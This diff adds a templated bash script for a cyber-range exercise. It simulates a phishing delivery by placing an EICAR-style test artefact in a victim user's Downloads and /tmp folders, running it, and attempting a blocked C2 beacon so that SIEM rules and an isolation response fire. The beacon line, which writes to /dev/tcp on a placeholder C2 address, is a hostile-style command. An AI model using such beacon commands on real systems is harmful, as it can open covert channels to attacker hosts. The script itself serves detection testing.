@@ -1,0 +1,80 @@
+#!/usr/bin/env bash
+# =============================================================================
+# Scenario kickoff — UML steps 1 -> 2.
+#
+# "Cyber Range -> Lab Hosts/Endpoints: inject simulated malware activity
+# (phishing email + payload delivery)". This runs ON the endpoint, because the
+# UML has no attacker host: the injection originates at the Cyber Range and
+# lands here. Nothing is fetched over the network and no service is contacted —
+# the staged payload is simply moved into the monitored paths, which is exactly
+# the observable behaviour a real delivery would produce.
+#
+# Benign by design: the payload is an EICAR-equivalent test artefact, generated
+# at provision time and never stored in the repository.
+#
+# DELIVERY IS MULTI-STAGE ON PURPOSE. Rule 100103 ("targeted attack confirmed",
+# UML step 6) correlates repeated IOC hits inside a 600 s window, and it is one
+# of the two rules wired to the containment active response. A single payload
+# drop fires 100101 exactly once, which would leave step 6 with no live trigger
+# and half the response path dead. Each stage below is a distinct event:
+#
+#   stage 1  payload -> ~{{ puc2_victim_user }}/Downloads      -> 100100 -> 100101
+#   stage 2  C2 beacon on tcp/{{ puc2_c2_port }}, blocked+logged by the
+#            baseline egress filter                            -> 100102
+#   stage 3  payload copied to /tmp (staging behaviour)        -> 100100 -> 100101
+#   stage 4  second payload name dropped in Downloads          -> 100100 -> 100101
+#                                                              => 100103 fires
+# =============================================================================
+set -uo pipefail
+
+STAGED="{{ puc2_injection_root }}/{{ puc2_payload_name }}"
+VICTIM="{{ puc2_victim_user }}"
+VICTIM_HOME="/home/{{ puc2_victim_user }}"
+C2_IP="{{ puc2_c2_ip }}"
+C2_PORT="{{ puc2_c2_port }}"
+STAGE_PAUSE="${STAGE_PAUSE:-20}"   # seconds between stages; all well inside 600
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "Must run as root (the payload is dropped as ${VICTIM})." >&2
+    exit 1
+fi
+if [ ! -f "${STAGED}" ]; then
+    echo "Staged payload missing: ${STAGED}. Re-run provisioning." >&2
+    exit 1
+fi
+
+drop_as_victim() {
+    local dest="$1"
+    install -o "${VICTIM}" -g "${VICTIM}" -m 0755 "${STAGED}" "${dest}"
+    echo "        dropped ${dest}"
+}
+
+echo "[CYBER RANGE] Initiating malware scenario (UML step 1)"
+echo "[CYBER RANGE] Phishing email delivered to ${VICTIM_HOME}/phishing_email.eml"
+echo "[CYBER RANGE] Injecting simulated malware activity (UML step 2)"
+
+echo "[INJECT] stage 1/4 — phishing link 'clicked', payload lands in Downloads"
+install -d -o "${VICTIM}" -g "${VICTIM}" -m 0755 "${VICTIM_HOME}/Downloads"
+drop_as_victim "${VICTIM_HOME}/Downloads/{{ puc2_payload_name }}"
+sudo -u "${VICTIM}" "${VICTIM_HOME}/Downloads/{{ puc2_payload_name }}" >/dev/null 2>&1 || true
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 2/4 — payload beacons to C2 on ${C2_IP}:${C2_PORT}"
+# A timeout, not a successful connection, is the expected outcome: the baseline
+# egress filter DROPs and LOGs it, and that log line is the firewall telemetry
+# rule 100102 decodes.
+timeout 5 bash -c "echo beacon > /dev/tcp/${C2_IP}/${C2_PORT}" 2>/dev/null || true
+echo "        beacon attempted (expected to be blocked and logged)"
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 3/4 — payload stages a copy in /tmp"
+drop_as_victim "/tmp/{{ puc2_payload_name }}"
+sleep "${STAGE_PAUSE}"
+
+echo "[INJECT] stage 4/4 — second lure dropped in Downloads"
+drop_as_victim "${VICTIM_HOME}/Downloads/statement.exe"
+
+echo
+echo "[INJECT] Delivery complete. Telemetry inbound to NG-SIEM."
+echo "[INJECT] Expected chain: 100100 -> 100101 (x3) + 100102 -> 100103"
+echo "[INJECT] Rules 100101/100103 fire the puc2-isolate active response."
